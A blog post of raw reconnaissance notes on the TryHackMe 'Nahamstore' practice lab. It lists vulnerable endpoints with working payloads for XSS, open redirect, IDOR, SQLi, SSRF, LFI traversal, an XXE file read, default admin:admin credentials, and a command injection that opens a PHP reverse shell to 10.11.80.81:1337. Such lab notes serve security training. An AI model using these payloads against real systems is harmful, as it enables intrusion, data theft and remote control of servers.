---
layout: post
title: "Nahamstore Recon Notes"
date: 2022-03-20 00:00:0
permalink: basic-goLang-for-hacking/
tags: bug bounty tryhackme
---
_Not a walkthrough or writeup. Just my raw recon notes and vulnerabilities_
<br><br>
### Root domains
- nahamstore.thm

### Web Technologies
- nginx, ubuntu, jqurey

---
## nahamstore.thm
__Ports:__ 22,80,8000

### www.nahamstore.thm, shop.nahamstore.thm -> nahamstore.thm
-   `/<img src=/ onerror=alert()>` [rXSS] [Page Not Found]
-   `/?q` [rXSS]
-   `/?r` [open redirect]
<br><br>
-	`/basket` [POST] [address_id] [IDOR, PII]
<br><br>
-	`/register` [POST] [register_email, register_password]
-	`/register?redirect_url` [open redirect]
<br><br>
-	`/returns` [POST] [return_info] [sXSS]
-   `/returns` [POST] [order_number] [SQLi]
<br><br>
-   `/uploads` [301 -> 127.0.0.1:80]
<br><br>
- 	`/login`
-	`/logout`
<br><br>
-	`/search?q='-alert("test")-'` [rXSS] [js param `search`]
-   `/?q=%22+onfocus%3Dalert()+autofocus+` [rXSS][searchbox]
<br><br>
-   `/stockcheck` [POST] [SSRF] 
`server=stock.nahamstore.thm@internal-api.nahamstore.thm?a=&product_id=1`
<br><br>
-	`/staff` [File Upload - "xlxs only"] [XXE via xlxs]
<br><br>
-   `/account/orders`
-   `/account/settings` [Email,password change, disable acct]
-   `/account/addressbook` [Address change]
-   `/account/addressbook` [POST] [`new_address_title,new_address_fname,new_address_lname,new_address_line1,new_address_line2,road,new_address_line3,new_address_state,new_address_zipcode`]
-   `/account/orders/3`
<br><br>
-   `/product?id=2&name=</title>` [rXSS] 
-   `/product?id=2&discount=" onfocus="alert()" autofocus "` [rXSS]
-   `/product` [Discount, Add to basket, Check Stock]
-   `/product?id=` [SQLi] [rXSS]
-   `/product` [POST] [discount] [rXSS]
-   `/product/picture/?file=....//....//....//....//....//lfi/flag.txt` [LFI] 
<br><br>
-   `/pdf-generator` [POST] [IDOR] 
`what=order&id=3%26user_id=3`
- `/pdf-generator` [POST] [Blind RCE]
`what=order&id=4%3b$(php+-r+'$sock%3dfsockopen("10.11.80.81",1337)%3bshell_exec("sh+<%263+>%263+2>%263")%3b')`

### internal-api.nahamstore.thm
-   `/orders` [Information Disclosuer, IDOR]
[`"id":"4dbc51716426d49f524e10d4437a5f5a","5ae19241b4b55a360e677fdd9084c21c","70ac2193c8049fcea7101884fd4ef58e"`]

### nahamstore.thm:8000
-   `/admin` [admin:admin] [Marketing Manager Dashboard]
-   `/admin/8d1952ba2b3c6dcd76236f090ab8642c` [RCE] [PHP rev shell]

### marketing.nahamstore.thm
-   `/?error=` [XSS]

### nahamstore-2020-dev.nahamstore.thm [API]
-   /api/customers/?customer_id=2 [IDOR, Information Disclosure]

### stock.nahamstore.thm [API]
-   `/product`
-   `/product/1`
-   `/product/1?xml` [XML output]
-   `/product/1?xml` [XXE] [POST]
```xml
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<data>
    <X-Token>
        &xxe;
    </X-Token>
</data>
```